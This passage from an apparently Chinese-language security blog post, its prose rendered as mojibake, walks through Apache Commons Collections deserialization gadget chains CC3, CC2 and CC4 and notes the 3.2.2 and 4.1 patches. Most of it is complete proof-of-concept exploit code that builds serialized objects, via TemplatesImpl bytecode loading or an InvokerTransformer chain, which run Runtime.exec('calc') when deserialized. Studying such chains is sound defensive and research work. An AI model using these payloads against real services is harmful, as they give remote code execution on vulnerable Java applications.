class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>demo</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(argMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>    evilMap.put(<span class="hljs-string">&quot;xxx&quot;</span>, <span class="hljs-string">&quot;yyy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠCC6æ”¹é€ ä¸€ä¸‹ï¼Œå°±å¾—åˆ°äº†CC3ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>        &#125;;<br>        <br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728215703672.png" alt="image-20240728215703672"></p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>å‰é¢å°±æåˆ°ï¼ŒCommons-Collectionæœ‰ä¿©å®˜æ–¹çš„åŒ…ï¼š</p><ul><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ul><p>ä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å…±å­˜åœ¨åŒâ¼€ä¸ªé¡¹ç›®ä¸­ã€‚</p><p>ä½¿ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹‹å‰æˆ‘ä»¬ç ”ç©¶çš„åˆ©ç”¨é“¾<code>CC1ã€CC6ã€CC3</code>åœ¨<code>commons-collections4</code>å‡èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä¸è¿‡æ–¹æ³•åå¯èƒ½ç¨æœ‰å˜åŠ¨ï¼Œå…¶å®å°±æ˜¯<code>Lazymap</code>å¤„decorateæ²¡äº†ï¼š</p><p>åŸdecorate:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªâ½…æ³•ä¸è¿‡å°±æ˜¯<code>LazyMap</code>æ„é€ å‡½æ•°çš„â¼€ä¸ªåŒ…è£…ï¼Œâ½½åœ¨4ä¸­å…¶å®åªæ˜¯æ”¹äº†ä¸ªåå­—å«<code>lazymap</code>ã€‚</p><p>4ä¸­çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;K, V&gt; map, <span class="hljs-keyword">final</span> </span><br><span class="hljs-params">Transformer&lt;? <span class="hljs-built_in">super</span> K, ? extends V&gt; factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>&lt;K,V&gt;(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†Gadgetä¸­å‡ºé”™çš„ä»£ç æ¢â¼€ä¸‹åå­—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>ç„¶åå¼¹calcæ˜¯ä¸€æ ·çš„ã€‚</p><p>ç”±æ­¤å¯å¾—ï¼ŒCCé“¾å®é™…ä¸Šå°±æ˜¯ä¸€æ¡<code>Serializable#readObject()</code>åˆ°<code>Transformer#transform()</code>çš„è°ƒç”¨é“¾ã€‚</p><p>è¦çœ‹CC2ï¼Œé‚£ä¹ˆè¿™é‡Œå°±éœ€è¦å¼•å…¥ä¸¤ä¸ªæ–°ç±»ï¼š</p><ul><li><code>java.util.PriorityQueue</code></li><li><code>org.apache.commons.collections4.comparators.TransformingComparator</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>&#123;<br>            s.defaultReadObject();<br>            s.readInt();<br>            queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>                queue[i] = s.readObject();<br>            heapify();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TransformingComparator#compare</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure><p>Gadget chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue#readObject() =&gt; <br>heapify() =&gt; <br>siftDown() =&gt; <br>siftDownUsingComparator() =&gt; <br>comparator.compare() =&gt; <br>transformer.transform()<br></code></pre></td></tr></table></figure><ul><li><code>heapify</code> <code>int i = (size &gt;&gt;&gt; 1) - 1</code>éœ€è¦éè´Ÿ</li><li><code>siftDownUsingComparator</code> <code>half = size &gt;&gt;&gt; 1</code>éœ€è¦å¤§äºä¸Šé¢çš„i</li></ul><p>è€Œä¸”<code>PriorityQueue</code>æ„é€ å‡½æ•°ä¸ä¼šç»™sizeèµ‹åˆå€¼ï¼Œéœ€è¦ç”¨åå°„å»èµ‹å€¼ã€‚</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">pq</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(comparator);<br>        setFieldValue(pq, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(pq);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728222834295.png" alt="image-20240728222834295"></p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code>åœ¨<code>commons-collections4.0</code>ä»¥å‰æ˜¯ç‰ˆæœ¬æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£</p><p>å®˜æ–¹å‘å¸ƒçš„æ–°ç‰ˆæœ¬4.1å’Œ3.2.2ç”¨äºä¿®å¤CCé“¾3.2.2ä¸­å¢åŠ äº†â¼€ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">FunctorUtils#checkUnsafeSerialization`<br></code></pre></td></tr></table></figure><p>å®ƒç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå…¶ä¼šæ£€æŸ¥å¸¸â»…çš„å±é™©Transformerç±»ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ è‹¥å¼€å‘è€…æ²¡æœ‰è®¾ç½®å…¨å±€é…ç½® <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> å³é»˜è®¤æƒ…å†µä¸‹ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>4.1ä¸­è¿™å‡ ä¸ªå±é™©çš„<code>Transformer</code>ç±»ä¸å†å®ç°<code>Serializable</code>æ¥å£ï¼Œç›´æ¥ä¸èƒ½åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><p><strong>å› æ­¤CC2åªèƒ½åœ¨<code>commons-collections4.0</code>ä¸Šè·‘é€šã€‚</strong></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>CC4è·ŸCC2å¾ˆæ¥è¿‘ã€‚éƒ½æ˜¯åœ¨Commons-Collections4çš„åŸºç¡€ä¸Šçš„CCé“¾ã€‚</p><p>è€Œæœ¬è´¨å…¶å®CC4å°±æ˜¯ç”¨<code>InstantiateTransformer</code>ä»£æ›¿äº†CC2çš„<code>InvokerTransformer</code>ï¼Œå€Ÿç”¨ä¸€ä¸‹<code>ysoserial</code>çš„ä»£ç ,å…¶å®å°±æ˜¯<code>CommonsCollections2</code>çš„<code>TemplatesImpl</code>å˜ä½“ï¼ŒæŠŠCC2å’ŒCC3æ‹¼æ¥ä¸€ä¸‹ï¼Œå°±å¾—åˆ°äº†CC4ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 